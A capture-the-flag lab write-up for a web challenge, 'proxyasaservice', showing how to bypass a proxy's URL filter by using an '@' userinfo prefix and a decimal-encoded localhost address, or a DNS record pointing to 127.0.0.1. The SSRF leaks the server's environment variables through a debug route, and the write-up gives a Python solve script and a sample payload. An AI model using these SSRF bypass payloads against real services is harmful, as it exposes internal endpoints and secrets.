# Challenge: proxyasaservice

**Lab Description**: Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.

## Lab Solution

When opening the localhost docker image, the proxy is working and redirecting us to reddit. The challenge comes with source.

We need to bypass restricted URL and also the SITE_NAME should be bypassed.

To bypass the restricted URL check we can change the IP format using Cyberchef "change IP format". In this case decimal representation is used.

```curl
➜  ~ curl -vv 1.1.1.1@google.com
*   Trying 142.250.74.174:80...
* Connected to google.com (142.250.74.174) port 80 (#0)
* Server auth using Basic with user '1.1.1.1'
> GET / HTTP/1.1
> Host: google.com
> Authorization: Basic MS4xLjEuMTo= #This is base64 for 1.1.1.1
```

The above curl command supplies reddit.com as a username for google.com. Much like an SSH login. This can be used to bypass the `SITE_NAME` variable in `routes.py`.

```curl
http://localhost:1337/?url=@2130706433:1337/debug/environment {"Environment variables":{"FLAG":"HTB{f4k3_fl4g_f0r_t3st1ng}","GPG_KEY":"7169605F62C751356D054A26A821E680E5FA6305","HOME":"/root","HOSTNAME":"7e9b4eb7267c","LANG":"C.UTF-8","PATH":"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PYTHONDONTWRITEBYTECODE":"1","PYTHON_GET_PIP_SHA256":"dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9","PYTHON_GET_PIP_URL":"https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py","PYTHON_PIP_VERSION":"24.0","PYTHON_VERSION":"3.12.2","SUPERVISOR_ENABLED":"1","SUPERVISOR_GROUP_NAME":"flask","SUPERVISOR_PROCESS_NAME":"flask","WERKZEUG_SERVER_FD":"3"},"Request headers":{"Accept":"*/*","Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Host":"2130706433:1337","User-Agent":"python-requests/2.31.0"}}
```

Solve script:

```python
import requests

url = "http://localhost:1337/?url=@2130706433:1337/debug/environment"

req = requests.get(url)

print(req.url, req.text)
```

Here the localhost in the link should be replaced with the challenge instance, but the decimal encoded IP should remain localhost. The decimal encoded URL makes the server request the resource as localhost and therefore is able to request the `/debug/environment` route which returns the environment variables in the response. As the flag is contained in the response!

This challenge can also be solved by using a false DNS record with requestrepo.com. This works by using the `SITE_NAME` variable as a subdomain to the request repo url which is supplied. This would look like this:

```python
import requests

url = "http://94.237.62.195:53665/?url=.4lqfri70.requestrepo.com:1337/debug/environment"

req = requests.get(url)

print(req.url, req.text)

```

Then the resulting url queried by the backend would be: `reddit.com.4lqfri70.requestrepo.com`. In request repo the DNS record for this URL to `127.0.0.1`.

